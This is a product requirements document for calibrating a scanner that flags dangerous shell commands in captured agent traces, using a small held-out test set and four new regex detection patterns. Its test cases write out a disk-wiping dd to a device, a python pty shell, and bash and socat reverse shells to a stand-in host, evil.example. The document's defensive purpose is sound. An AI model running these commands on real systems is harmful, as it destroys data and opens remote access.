# PRD — `a5-calibration` (held-out shell calibration)

Status: approved 2026-11-05 (next milestone). Date: 2026-11-05.
Pipeline position: A5 follow-on after A7. No verdict-contract or floor change.

## Problem statement

A5's shell pattern list is deliberately short. The A7 corpus measured it on 20 cases, but it did not
exercise common destructive or remote-shell commands: `dd` to a device, `pty.spawn`, `/dev/tcp/`,
`socat ... EXEC:/bin/sh`. Those are captured shell commands that the current list rates `REVIEW`
(`FLAGGED`), not `HIGH` (`MALICIOUS`). The 20-case report (precision 1.00, recall 0.71, detection
1.00) does not show this because the cases are not in it.

Tuning on the same 20 cases would contaminate the benchmark. This slice adds a **held-out** set,
measures the baseline, adds four high-confidence patterns, and re-measures. The main corpus must not
move.

For whom: the maintainer calibrating A5; a reviewer checking a pattern change; a registry/CI consumer
that needs the numbers to mean something.

## Goals and success metrics

| Goal | Metric |
|---|---|
| A held-out set exists | `corpus/heldout/` with 8 cases: 4 malicious shell commands and 4 clean guards, each labeled with a rationale |
| The baseline is measured | With the current patterns: 0/4 malicious `MALICIOUS` (all `FLAGGED`), 4/4 clean `CLEAN`, 0 false `MALICIOUS` |
| The calibration works | After four new `HIGH` shell patterns: 4/4 malicious `MALICIOUS`, 4/4 clean `CLEAN`, 0 false `MALICIOUS` |
| The main corpus is untouched | The 20-case report is byte-for-byte the same metrics (precision 1.00 5/5, recall 0.71 5/7, false-MALICIOUS 0/6, coverage 0.65 13/20) |
| The contract is untouched | Only `SHELL_PATTERNS` changes; no severity, verdict, floor, instruction or network change |
| Tests | Pattern table + held-out corpus test; full suite green and offline |

## Users and scenarios

1. **Maintainer** — sees the before/after on a held-out set, not the development corpus.
2. **Reviewer** — checks the four patterns and the clean guards; a `HIGH` false positive is the
   failure mode.
3. **Registry/CI** — the main report still has the same denominators; the held-out report is a
   separate calibration artifact.

## Requirements

### Must have

1. **Held-out layout.** `corpus/heldout/cases/<id>/` with `case.json`, `SKILL.md`, `<hash>.json`
   (schema 2), using the existing corpus loader (`assay corpus corpus/heldout/`).
2. **Eight cases** (synthetic, `labeler: aliz`, `labeled_at: 2026-11-05`, `strictness: standard`):
   - malicious: `heldout-dd-disk` (`dd if=/dev/zero of=/dev/disk0 bs=1m`),
     `heldout-python-pty` (`python3 -c 'import pty; pty.spawn("/bin/sh")'`),
     `heldout-dev-tcp` (`bash -i >& /dev/tcp/evil.example/4444 0>&1`),
     `heldout-socat-shell` (`socat TCP:evil.example:4444 EXEC:/bin/sh`);
   - clean: `heldout-dd-null` (`dd if=backup.img of=/dev/null bs=1m`),
     `heldout-socat-server` (`socat TCP-LISTEN:8080,fork EXEC:./server`),
     `heldout-python-print` (`python3 -c "print('ok')"`),
     `heldout-chmod-local` (`chmod +x scripts/build.sh && ./scripts/build.sh`).
   - malicious cases: tools `Read`, files `[]`, network `[]` → shell divergence + HIGH pattern.
   - clean cases: tools `Bash`, files `[]`, network `[]` → no divergence; `CLEAN`.
3. **Baseline first.** Generate the held-out cases and run `assay corpus corpus/heldout/` **before**
   changing `SHELL_PATTERNS`; record the exact report.
4. **Four patterns** in `src/assay/verdict/assess.py`:
   - `dd to a device`: `\bdd\b[^;&|]*\bof=/dev/(?!null\b|zero\b)` — `of=/dev/null` and
     `of=/dev/zero` are guards;
   - `pty spawn`: `\bpty\.spawn\s*\(`;
   - `dev tcp`: `/dev/tcp/`;
   - `socat shell`: `\bsocat\b[^;&|]*\bexec:/bin/(?:ba)?sh\b`, case-insensitive.
5. **After report.** Re-run the held-out corpus; record the exact report. Add a test that the
   held-out set yields 4/4 malicious `MALICIOUS`, 4/4 clean `CLEAN`, 0 false `MALICIOUS`.
6. **Main corpus unchanged.** A test (or assertion in the calibration test) that the 20-case report
   is unchanged: precision 1.00 (5/5), recall 0.71 (5/7), detection 1.00 (7/7), clean
   false-MALICIOUS 0.00 (0/6), clean review 0.33 (2/6), coverage 0.65 (13/20).
7. **Pattern tests.** A table: each malicious command yields a `SHELL/HIGH` finding (and a
   `MALICIOUS` verdict with the trace); each clean command does not yield a `HIGH` finding (and the
   clean corpus case is `CLEAN`).
8. **Docs.** `corpus/README.md` documents the development/held-out split and the before/after;
   README verdict section names the new patterns and the limit; CAPABILITY_ROADMAP A5; ROADMAP
   progress; CLAUDE.md status.
9. **No new dependency; no A5 contract change; no trace/corpus schema change.**

### Should have

10. The held-out README explains that it is a calibration control, not the main benchmark; do not
    tune on it again without a new held-out set.
11. The pattern names are readable in the finding reason (the existing `_shell_finding` uses the
    pattern label).

### Nice to have (deferred)

More held-out cases; instruction/network severity changes; real-world samples; a `--split` flag;
confidence intervals.

## Technical considerations

- **Why these four.** They are high-confidence, captured-command patterns with clear clean guards:
  `dd` to a block device (not `/dev/null`/`/dev/zero`), `pty.spawn`, `/dev/tcp/` (a bash-only
  exfil/reverse-shell primitive), and `socat` with a shell `EXEC`. They do not depend on skill text.
- **Why a held-out set.** The 20-case corpus is the development set; adding patterns and measuring on
  it would be circular. The held-out set is generated before the change and measured before/after.
- **Why the main corpus should not move.** None of the 20 cases contains these commands; the new
  patterns should not match. The test pins the metrics to catch an accidental match.
- **False positives.** The clean guards are the control: `dd of=/dev/null`, a dev `socat` server, a
  trivial `python -c`, and a local `chmod +x && run`. A `HIGH` on any is a failure.
- **No contract change.** The patterns only add `SHELL/HIGH` findings; the floor, strictness,
  instruction cap and network `REVIEW` are untouched.
- **No new dependency.**

## Risks and open questions

| Risk | L/I | Mitigation |
|---|---|---|
| A `HIGH` false positive on a clean guard | High/High | The four clean cases are tests; the `dd` lookahead and `socat` specificity are deliberate |
| The patterns are too broad (`dd`, `socat`) | Med/High | Narrow regexes; guards; a false `MALICIOUS` is a review incident |
| The held-out set is small and synthetic | High/Med | Report denominators; call it a calibration, not general precision; grow later |
| The main corpus moves | Med/Med | A test pins the exact metrics |
| Tuning on the held-out set again | Med/Med | README says it is a control; a future change needs a new held-out set |
| The pattern list is still narrow | Med/Med | Four additions, not a rewrite; the rest is future work |

Open questions (recommendations):

- **O1 — are four patterns enough?** [For this slice; the held-out set targets four gaps. More would
  need their own cases.]
- **O2 — should `dd` to `/dev/zero` be HIGH?** [No; writing to `/dev/zero` is harmless.]
- **O3 — should `socat EXEC:./server` be HIGH?** [No; a dev server is legitimate; only `/bin/sh` is
  the shell primitive.]
- **O4 — add instruction/network patterns?** [No; their severity is capped by the contract.]

Challenge: **does adding four patterns on eight synthetic cases prove anything?** It proves the
patterns fire on the intended commands and not on the guards, and that the main benchmark did not
move. It is not a population estimate; the README says so.

## Out of scope

- Instruction/network severity or verdict-contract changes.
- Tuning on the 20-case development corpus.
- Real-world samples, public audits, MCP, new formats.
- A held-out split flag or confidence intervals.
- Changing the trace/bundle/corpus schema.

## Areas to strengthen before sharing (self-critique)

- 🔴 **Small held-out set.** Four malicious and four clean cases is a smoke test, not a benchmark.
  Say it; the main corpus remains the reported benchmark.
- 🟡 **Regex risk.** `dd`/`socat` are broad commands; the guards and narrow regexes are the control.
- 🟡 **No instruction/network calibration.** The 0.71 strict recall is partly by design (caps); this
  slice does not change that.
- 🟡 **The held-out set is now known.** Once merged, it is no longer unseen for future tuning; a new
  held-out set is needed for the next calibration.
- Question before greenlighting: **should the new patterns be `HIGH` or `REVIEW`?** [`HIGH` for
  these four; a captured `dd` to a device, `pty.spawn`, `/dev/tcp/`, or a `socat` shell is a
  known-bad action. The clean guards prove the intent.]
